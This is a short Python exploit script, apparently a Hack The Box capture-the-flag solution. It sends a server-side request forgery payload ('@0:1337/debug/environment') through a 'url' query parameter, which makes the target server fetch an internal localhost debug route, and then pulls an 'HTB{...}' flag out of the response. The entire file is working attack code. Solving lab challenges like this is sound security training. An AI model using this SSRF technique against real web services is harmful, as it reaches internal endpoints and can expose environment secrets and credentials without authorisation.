import sys
import requests
import re
from urllib.parse import urljoin, urlencode

def run_exploit(host):
    base_url = f"http://{host}/"

    # SSRF payload to access internal debug route via localhost
    payload_path = "/debug/environment"
    payload = "@0:1337" + payload_path

    # Build the full URL with the encoded ?url= parameter
    full_url = urljoin(base_url, "/") + "?" + urlencode({"url": payload})

    try:
        # Send the SSRF request
        response = requests.get(full_url, timeout=5, verify=False)
        response.raise_for_status()
    except:
        sys.exit(1)

    # Search for the flag in the response
    flag = re.search(r"HTB\{.*?\}", response.text)
    if flag:
        print(flag.group(0))
    else:
        sys.exit(1)

if __name__ == "__main__":
    # Check for correct usage
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py ip:port")
        sys.exit(1)

    run_exploit(sys.argv[1])
